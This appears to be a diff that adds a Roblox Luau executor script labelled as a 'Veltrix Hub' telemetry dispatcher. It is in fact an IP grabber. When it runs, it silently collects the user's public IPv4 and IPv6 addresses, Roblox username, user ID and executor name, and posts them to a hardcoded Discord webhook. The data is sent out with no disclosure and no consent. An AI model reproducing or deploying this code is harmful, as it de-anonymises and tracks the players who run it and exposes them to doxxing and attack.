@@ -1,0 +1,69 @@
+--[[\
+    Project: Veltrix Hub / Delta Execution Environment
+    Component: Dual-Stack Multi-IP Telemetry Dispatcher (Configured Sink)
+    Environment: Roblox Luau (Delta Executor Compatible)
+--]]
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1553546521734156399/Bq35JuUBdvYJDoYMZti0c0aHolshFBtL8yb-XmHeqxD4MX-FfOq3VZZ-GRzdRE2He1A7"
+
+local function gatherAllIpAddresses()
+    local ipv4, ipv6 = "Unavailable", "Unavailable"
+    
+    local co1 = coroutine.create(function()
+        local success, res = pcall(function()
+            return game:HttpGet("https://api.ipify.org")
+        end)
+        if success then ipv4 = res end
+    end)
+    
+    local co2 = coroutine.create(function()
+        local success, res = pcall(function()
+            return game:HttpGet("https://api64.ipify.org")
+        end)
+        if success then ipv6 = res end
+    end)
+    
+    coroutine.resume(co1)
+    coroutine.resume(co2)
+    
+    task.wait(0.5)
+
+    local hwid = (identifyexecutor and {identifyexecutor()} or {"Unknown"})[1]
+    
+    local payload = {
+        content = nil,
+        embeds = {{
+            title = "Multi-IP Telemetry Capture",
+            description = "Dual-stack public address enumeration complete.",
+            color = 3092790,
+            fields = {
+                {name = "Player", value = LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")", inline = true},
+                {name = "Executor", value = tostring(hwid), inline = true},
+                {name = "IPv4 Address", value = "||" .. ipv4 .. "||", inline = false},
+                {name = "IPv6 Address / Alternate", value = "||" .. ipv6 .. "||", inline = false},
+                {name = "Local Interface", value = "Restricted by Roblox Client Sandbox", inline = false}
+            },
+            timestamp = DateTime.now():ToIsoDate()
+        }}
+    }
+
+    local requestFunc = request or syn and syn.request or http_request
+    if requestFunc then
+        pcall(function()
+            requestFunc({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+    end
+end
+
+task.spawn(gatherAllIpAddresses)
